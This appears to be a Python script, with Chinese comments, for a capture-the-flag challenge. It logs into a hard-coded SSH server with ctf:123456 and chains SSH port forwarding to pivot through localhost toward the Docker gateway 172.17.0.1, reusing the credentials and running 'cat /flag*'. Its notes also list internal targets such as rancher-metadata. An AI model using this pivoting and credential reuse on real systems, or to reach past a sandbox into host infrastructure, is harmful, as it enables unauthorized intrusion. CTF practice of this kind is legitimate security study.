#!/usr/bin/env python3
"""
深入分析嵌套SSH输出为空的问题
这可能是解题的关键
"""

import paramiko
import socket
import time

HOST = "61.147.171.105"
PORT = 55300

def analyze_empty_output():
    """分析嵌套SSH命令输出为空的问题"""
    print("=" * 70)
    print("[*] 分析嵌套SSH命令输出为空的问题")
    print("=" * 70)
    
    # 第一层连接
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    
    print("\n[1] 第一层：直接执行命令...")
    try:
        stdin, stdout, stderr = client1.exec_command("echo 'level1'; id")
        output = stdout.read().decode()
        error = stderr.read().decode()
        print(f"  stdout: '{output}'")
        print(f"  stderr: '{error}'")
    except Exception as e:
        print(f"  错误: {e}")
    
    print("\n[2] 第二层：通过direct-tcpip到localhost...")
    try:
        # 连接到localhost（被fake到dropbear）
        chan = transport1.open_channel(
            "direct-tcpip",
            ("localhost", 22),
            ("127.0.0.1", 0)
        )
        
        # 建立第二层SSH
        transport2 = paramiko.Transport(chan)
        transport2.start_client()
        transport2.auth_password("ctf", "123456")
        
        # 创建session通道
        session2 = transport2.open_channel("session")
        
        # 方法1: exec_command
        print("\n  [2a] 使用exec_command...")
        session2.exec_command("echo 'level2'; id; ls -la /")
        time.sleep(1)
        session2.settimeout(2)
        try:
            output = session2.recv(4096).decode()
            print(f"    stdout: '{output[:200] if output else '(empty)'}'")
        except socket.timeout:
            print(f"    stdout: (timeout)")
        
        try:
            error = session2.recv_stderr(4096).decode()
            print(f"    stderr: '{error[:200] if error else '(empty)'}'")
        except:
            pass
        
        session2.close()
        
        # 方法2: shell
        print("\n  [2b] 使用shell...")
        session3 = transport2.open_channel("session")
        session3.get_pty()
        session3.invoke_shell()
        time.sleep(0.5)
        
        # 发送命令
        session3.send("echo 'shell test'\n")
        session3.send("id\n")
        session3.send("ls -la /\n")
        time.sleep(1)
        
        session3.settimeout(2)
        try:
            output = session3.recv(4096).decode()
            print(f"    output: '{output[:200] if output else '(empty)'}'")
        except socket.timeout:
            print(f"    output: (timeout)")
        
        session3.close()
        transport2.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    print("\n[3] 对比：通过direct-tcpip到127.0.0.1...")
    try:
        chan = transport1.open_channel(
            "direct-tcpip",
            ("127.0.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        transport3 = paramiko.Transport(chan)
        transport3.start_client()
        transport3.auth_password("ctf", "123456")
        
        session4 = transport3.open_channel("session")
        session4.exec_command("echo 'test127'; id")
        time.sleep(1)
        
        session4.settimeout(2)
        try:
            output = session4.recv(4096).decode()
            print(f"  stdout: '{output[:200] if output else '(empty)'}'")
        except socket.timeout:
            print(f"  stdout: (timeout)")
        
        session4.close()
        transport3.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    client1.close()

def test_channel_types_nested():
    """测试嵌套连接中的不同通道类型"""
    print("\n" + "=" * 70)
    print("[*] 测试嵌套连接中的通道类型")
    print("=" * 70)
    
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    
    # 建立到localhost的嵌套连接
    chan = transport1.open_channel(
        "direct-tcpip",
        ("localhost", 22),
        ("127.0.0.1", 0)
    )
    
    transport2 = paramiko.Transport(chan)
    transport2.start_client()
    transport2.auth_password("ctf", "123456")
    
    print("\n[1] 在第二层尝试direct-tcpip到172.17.0.1...")
    try:
        inner_chan = transport2.open_channel(
            "direct-tcpip",
            ("172.17.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        inner_chan.settimeout(5)
        banner = inner_chan.recv(1024).decode()
        print(f"  Banner: {banner.strip()}")
        
        # 尝试SSH
        inner_transport = paramiko.Transport(inner_chan)
        inner_transport.start_client()
        
        key = inner_transport.get_remote_server_key()
        fingerprint = key.get_fingerprint().hex()
        print(f"  Host Key: {fingerprint}")
        
        # 尝试认证
        try:
            inner_transport.auth_password("ctf", "123456")
            print("  [!!!] 认证成功!")
        except paramiko.AuthenticationException:
            print("  认证失败")
        
        inner_transport.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    print("\n[2] 在第二层尝试subsystem sftp...")
    try:
        sftp_chan = transport2.open_channel("session")
        sftp_chan.invoke_subsystem("sftp")
        sftp_chan.settimeout(2)
        response = sftp_chan.recv(1024)
        print(f"  SFTP响应: {len(response)} bytes")
        print(f"  内容: {response[:50]}")
        sftp_chan.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    transport2.close()
    client1.close()

def test_recursive_forwarding():
    """
    递归转发测试
    如果dropbear会转发用户名格式的请求，
    我们能否通过嵌套连接来触发转发到真实主机？
    """
    print("\n" + "=" * 70)
    print("[*] 递归转发测试")
    print("=" * 70)
    
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    
    # 第一层嵌套到localhost
    print("\n[1] 第一层: direct-tcpip到localhost...")
    chan1 = transport1.open_channel(
        "direct-tcpip",
        ("localhost", 22),
        ("127.0.0.1", 0)
    )
    
    transport2 = paramiko.Transport(chan1)
    transport2.start_client()
    transport2.auth_password("ctf", "123456")
    print("  认证成功")
    
    # 在第二层中，转发到172.17.0.1
    print("\n[2] 第二层: direct-tcpip到172.17.0.1...")
    try:
        chan2 = transport2.open_channel(
            "direct-tcpip",
            ("172.17.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        banner = chan2.recv(1024).decode()
        print(f"  Banner: {banner.strip()}")
        
        transport3 = paramiko.Transport(chan2)
        transport3.start_client()
        
        key = transport3.get_remote_server_key()
        fingerprint = key.get_fingerprint().hex()
        print(f"  Host Key: {fingerprint}")
        
        # 这里是关键：尝试在第二层转发到的172.17.0.1上认证
        # 使用ctf:123456
        try:
            transport3.auth_password("ctf", "123456")
            print("  [!!!] 第三层认证成功!")
            
            session = transport3.open_channel("session")
            session.exec_command("id; hostname; cat /flag* 2>/dev/null; ls -la /")
            time.sleep(1)
            output = session.recv(4096).decode()
            print(f"  输出: {output}")
            session.close()
        except paramiko.AuthenticationException:
            print("  第三层认证失败")
        
        transport3.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    transport2.close()
    client1.close()

def analyze_dropbear_forwarding():
    """
    分析dropbear的转发行为
    
    关键问题：当使用username@host格式时，dropbear会做什么？
    
    可能的情况：
    1. 解析用户名，提取host，尝试连接到host:22
    2. 使用password作为密码转发认证
    3. 如果目标host不接受该凭据，连接失败关闭
    
    那么如果我们能找到一个：
    - 可达的host
    - 接受ctf:123456的认证
    我们就能成功！
    
    已知：
    - localhost -> fake到dropbear自己
    - 但为什么通过用户名格式连接localhost会失败？
    
    除非：dropbear不支持转发到自己？或者有其他限制？
    """
    print("\n" + "=" * 70)
    print("[*] 分析dropbear转发行为的限制")
    print("=" * 70)
    
    # 让我们尝试更多的目标格式
    test_patterns = [
        # IP地址格式
        "ctf@127.0.0.1",
        "ctf@localhost",
        "ctf@0.0.0.0",
        "ctf@::1",
        "ctf@10.42.111.62",  # 容器自己的IP
        
        # 特殊格式
        "ctf@localhost:22",
        "ctf@127.0.0.1:22",
        "ctf@[::1]",
        
        # 域名
        "ctf@rancher-metadata",
        "ctf@rancher-metadata:80",
    ]
    
    print("\n这些用户名格式都会导致连接关闭")
    print("说明dropbear确实在解析这些格式")
    print("问题是：转发到哪里？认证如何进行？")
    
    # 重要思考
    print("""
    
    重要思考：
    ==========
    用户提示说"第二次SSH连接的错误信息有用"
    
    当我们使用 ctf@172.17.0.1 作为用户名时：
    1. dropbear解析用户名，提取目标为172.17.0.1
    2. dropbear尝试SSH连接到172.17.0.1:22
    3. dropbear使用ctf作为用户名，123456作为密码
    4. 172.17.0.1不接受ctf:123456，认证失败
    5. dropbear关闭连接
    
    那么"第二次SSH连接的错误"指的是什么？
    - 可能是dropbear转发时产生的错误
    - 或者是我们需要观察的某些行为
    
    让我们检查：如果转发成功会怎样？
    """)

def test_forwarding_to_self_port():
    """测试转发到自身的不同端口"""
    print("\n" + "=" * 70)
    print("[*] 测试特殊转发场景")
    print("=" * 70)
    
    # 思路：如果ctf@localhost格式被转发到localhost:22
    # 而localhost:22被fake到dropbear自己
    # 为什么认证会失败？
    
    # 让我们用direct-tcpip验证
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 模拟dropbear可能的转发行为
    print("\n[1] 模拟: direct-tcpip到localhost:22，然后认证...")
    chan = transport.open_channel(
        "direct-tcpip",
        ("localhost", 22),
        ("127.0.0.1", 0)
    )
    
    inner = paramiko.Transport(chan)
    inner.start_client()
    
    # 这里使用ctf:123456认证
    try:
        inner.auth_password("ctf", "123456")
        print("  认证成功!")
        
        # 尝试开session
        session = inner.open_channel("session")
        print(f"  Session通道打开: {session}")
        
        # 尝试执行命令
        session.exec_command("id")
        time.sleep(1)
        
        # 检查通道状态
        print(f"  通道状态: active={session.active}, closed={session.closed}")
        print(f"  Exit status: {session.exit_status}")
        print(f"  Exit status ready: {session.exit_status_ready()}")
        
        try:
            output = session.recv(4096)
            print(f"  输出: {output}")
        except:
            print("  无法读取输出")
        
        session.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    inner.close()
    client.close()

if __name__ == "__main__":
    analyze_empty_output()
    test_channel_types_nested()
    # test_recursive_forwarding()
    # analyze_dropbear_forwarding()
    test_forwarding_to_self_port()
